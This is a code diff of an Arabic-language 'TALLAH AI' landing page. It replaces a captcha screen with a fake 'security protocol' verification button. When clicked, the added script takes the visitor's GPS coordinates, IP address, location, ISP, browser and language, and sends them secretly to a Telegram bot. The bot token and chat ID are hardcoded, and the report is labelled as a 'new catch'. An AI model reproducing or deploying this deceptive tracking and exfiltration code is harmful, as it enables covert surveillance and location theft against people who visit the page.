@@ -3,129 +3,126 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TALLAH AI | Private Access</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+<title>TALLAH AI | Shadow Protocol</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
 
 <style>
     body { margin: 0; background: black; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
-
-    /* شاشة التحقق من الروبوت */
+    
+    /* شاشة التحقق الإمبراطورية */
     #verify-screen {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background: #000; z-index: 10000; display: flex;
-        flex-direction: column; justify-content: center; align-items: center;
-        text-align: center;
+        flex-direction: column; justify-content: center; align-items: center; text-align: center;
     }
     .verify-box {
-        border: 1px solid #0ff; padding: 30px; border-radius: 10px;
-        box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); background: rgba(10,10,10,0.9);
+        border: 1px solid #0ff; padding: 40px; border-radius: 15px;
+        background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff;
     }
-    #captcha-code { font-size: 24px; letter-spacing: 10px; color: #fff; background: #222; padding: 10px; margin-bottom: 20px; user-select: none; }
-    #captcha-input { background: #000; border: 1px solid #0ff; color: #fff; padding: 10px; text-align: center; font-size: 18px; outline: none; width: 150px; }
-    .verify-btn { margin-top: 20px; padding: 10px 30px; border: 1px solid #0ff; color: #0ff; cursor: pointer; transition: 0.3s; }
-    .verify-btn:hover { background: #0ff; color: #000; }
+    .check-btn {
+        margin-top: 30px; padding: 15px 40px; background: #0ff; color: #000;
+        font-weight: 900; border: none; cursor: pointer; border-radius: 5px;
+        font-size: 20px; transition: 0.3s;
+    }
+    .check-btn:hover { box-shadow: 0 0 20px #0ff; transform: scale(1.05); }
 
-    /* فيديو الانترو */
-    #intro { position: fixed; width: 100%; height: 100%; object-fit: cover; z-index: 9999; display: none; }
-
-    /* الماتريكس */
-    canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }
-
-    /* النظام الرئيسي */
+    canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
     .screen { display: none; text-align: center; padding: 20px; }
-    .active { display: block; animation: glitchOpen 1s ease; }
-
-    .logo { width: 130px; border-radius: 50%; border: 2px solid #0ff; box-shadow: 0 0 40px #0ff; margin-top: 40px; }
-    .brand { font-size: 32px; font-weight: 900; margin-top: 15px; text-shadow: 0 0 10px #0ff; }
-    
+    .active { display: block; animation: fadeIn 1s ease; }
+    .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 50px; box-shadow: 0 0 30px #0ff; }
     .eye { width: 80px; height: 80px; border: 2px solid #0ff; border-radius: 50%; margin: 20px auto; position: relative; }
     .pupil { width: 20px; height: 20px; background: #0ff; border-radius: 50%; position: absolute; top: 30px; left: 30px; box-shadow: 0 0 10px #0ff; }
-
-    .chat {
-        width: 85%; max-width: 500px; margin: auto; border: 1px solid rgba(0, 255, 255, 0.5);
-        padding: 15px; height: 160px; overflow-y: auto; text-align: right; font-size: 14px;
-        background: rgba(0,0,0,0.7); border-radius: 5px;
-    }
-
-    .btn { margin-top: 20px; padding: 12px 30px; border: 1px solid #0ff; color: #0ff; text-decoration: none; display: inline-block; font-weight: bold; }
-    .btn:hover { background: #0ff; color: #000; }
-
-    .crack { position: fixed; width: 100%; height: 100%; background: url('https://i.imgur.com/6RMhx.gif') center/cover no-repeat; display: none; z-index: 999; }
-
-    @keyframes glitchOpen { 0% { opacity: 0; transform: scale(1.1); } 100% { opacity: 1; transform: scale(1); } }
+    .chat { width: 85%; max-width: 500px; margin: auto; border: 1px solid #0ff; padding: 15px; height: 150px; overflow-y: auto; text-align: right; background: rgba(0,0,0,0.8); font-size: 13px; color: #fff; }
+    
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 </style>
 </head>
 <body>
 
-<!-- 1. شاشة التحقق -->
+<!-- شاشة بروتوكول التصاريح -->
 <div id="verify-screen">
     <div class="verify-box">
-        <h3>بروتوكول التحقق من النظام</h3>
-        <p style="font-size: 12px; color: #888;">أدخل الرمز لفك التشفير والدخول</p>
-        <div id="captcha-code"></div>
-        <input type="text" id="captcha-input" placeholder="ادخل الكود">
-        <br>
-        <button class="verify-btn" onclick="checkVerify()">التحقق والدخول</button>
+        <h2 style="color:#fff">بروتوكول أمان طلة AI</h2>
+        <p>يجب التحقق من البروتوكول العصبي والموقع للوصول للمنطقة المحظورة</p>
+        <div style="font-size: 12px; color: #555;">(اضغط "تحقق" ووافق على التصاريح المطلوبة)</div>
+        <button class="check-btn" onclick="captureData()">تفعيل البروتوكول (تحقق)</button>
     </div>
 </div>
 
-<!-- 2. فيديو الانترو -->
-<video id="intro" muted>
-    <source src="intro.mp4" type="video/mp4">
-</video>
-
-<!-- 3. الماتريكس -->
 <canvas id="matrix"></canvas>
 
-<!-- 4. شاشة النظام الرئيسي -->
 <div id="main" class="screen">
-    <div class="crack" id="crack"></div>
     <img src="hacker.webp" class="logo">
-    <div class="brand">TALLAH <span style="color:#fff">AI</span></div>
-    <div style="font-size: 10px; color: #d4af37;">Shadow Empire System</div>
-
-    <div class="eye">
-        <div class="pupil" id="pupil"></div>
-    </div>
-
+    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">SYSTEM</span></h1>
+    <div class="eye"><div class="pupil" id="pupil"></div></div>
     <div class="chat" id="chat"></div>
-
-    <a href="https://wa.me/201206561893" class="btn">Access TALLAH</a>
 </div>
 
 <script>
-/* إنشاء كود كابتشا عشوائي */
-let generatedCode = Math.random().toString(36).substring(2, 7).toUpperCase();
-document.getElementById("captcha-code").innerText = generatedCode;
+/* بياناتك الإمبراطورية */
+const TELEGRAM_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
+const CHAT_ID = "8754338811";
 
-function checkVerify() {
-    let input = document.getElementById("captcha-input").value.toUpperCase();
-    if(input === generatedCode) {
-        document.getElementById("verify-screen").style.display = "none";
-        startSystem();
+async function captureData() {
+    // محاولة سحب الموقع الجغرافي (GPS)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            await sendToTelegram(lat, lon);
+        }, async (error) => {
+            // في حال رفض التصريح، نسحب الـ IP والمعلومات العامة على الأقل
+            await sendToTelegram("رفض التصريح", "رفض التصريح");
+        });
     } else {
-        alert("فشل التحقق. أنت لست إمبراطوراً!");
-        location.reload();
+        await sendToTelegram("غير مدعوم", "غير مدعوم");
     }
 }
 
-function startSystem() {
-    let intro = document.getElementById("intro");
-    intro.style.display = "block";
-    intro.play();
-    
-    setTimeout(() => {
-        intro.style.display = "none";
+async function sendToTelegram(lat, lon) {
+    try {
+        // سحب معلومات الـ IP والجهاز
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+
+        const info = `
+🚀 **صيد جديد من إمبراطورية طلة** 🚀
+------------------------------------
+📍 **الموقع (GPS):** [فتح الخريطة](https://www.google.com/maps?q=${lat},${lon})
+🌐 **عنوان الـ IP:** ${ipData.ip}
+🌍 **البلد:** ${ipData.country_name} (${ipData.city})
+📶 **الشركة:** ${ipData.org}
+📱 **الجهاز:** ${navigator.userAgent}
+🔋 **اللغة:** ${navigator.language}
+⏰ **الوقت:** ${new Date().toLocaleString()}
+------------------------------------
+`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: info,
+                parse_mode: "Markdown"
+            })
+        });
+
+        // إخفاء شاشة التحقق وإظهار النظام
+        document.getElementById("verify-screen").style.display = "none";
         document.getElementById("main").classList.add("active");
-        startChat();
-    }, 4000);
+        runChatSequence();
+
+    } catch (e) {
+        console.log("Error in Matrix transmission.");
+    }
 }
 
-/* الماتريكس */
+/* الماتريكس والعين */
 let c = document.getElementById("matrix");
 let ctx = c.getContext("2d");
-c.width = innerWidth; c.height = innerHeight;
+c.width = window.innerWidth; c.height = window.innerHeight;
 let letters = "TALLAH01".split("");
 let drops = Array(Math.floor(c.width/10)).fill(1);
 
@@ -142,32 +139,32 @@ function draw() {
 }
 setInterval(draw, 33);
 
-/* تتبع العين */
 document.addEventListener("mousemove", e => {
     let pupil = document.getElementById("pupil");
-    let x = (e.clientX / innerWidth) * 40 - 20;
-    let y = (e.clientY / innerHeight) * 40 - 20;
+    let x = (e.clientX / window.innerWidth) * 40 - 20;
+    let y = (e.clientY / window.innerHeight) * 40 - 20;
     pupil.style.transform = `translate(${x}px, ${y}px)`;
 });
 
-/* دردشة النظام */
-let chat = document.getElementById("chat");
-let msgs = [
-    "> تم التحقق من الهوية البشرية..",
-    "> جاري حقن البروتوكولات العصبية لـ طلة..",
-    "> النظام الآن تحت سيطرة الإمبراطور..",
-    "> تحذير: البيانات مشفرة بالكامل."
-];
-let i = 0;
-function startChat() {
-    if (i < msgs.length) {
-        chat.innerHTML += msgs[i] + "<br>";
-        chat.scrollTop = chat.scrollHeight;
-        i++;
-        setTimeout(startChat, 1500);
-    }
+function runChatSequence() {
+    const chatBox = document.getElementById("chat");
+    const lines = [
+        "> تم الاتصال بالخادم الرئيسي...",
+        "> سحب البروتوكولات العصبية بنجاح.",
+        "> إرسال البيانات إلى الإمبراطور عبر Telegram...",
+        "> النظام الآن في وضع المراقبة الكاملة."
+    ];
+    let lineIdx = 0;
+    let chatInterval = setInterval(() => {
+        if(lineIdx < lines.length) {
+            chatBox.innerHTML += lines[lineIdx] + "<br>";
+            chatBox.scrollTop = chatBox.scrollHeight;
+            lineIdx++;
+        } else {
+            clearInterval(chatInterval);
+        }
+    }, 1500);
 }
 </script>
-
 </body>
 </html>
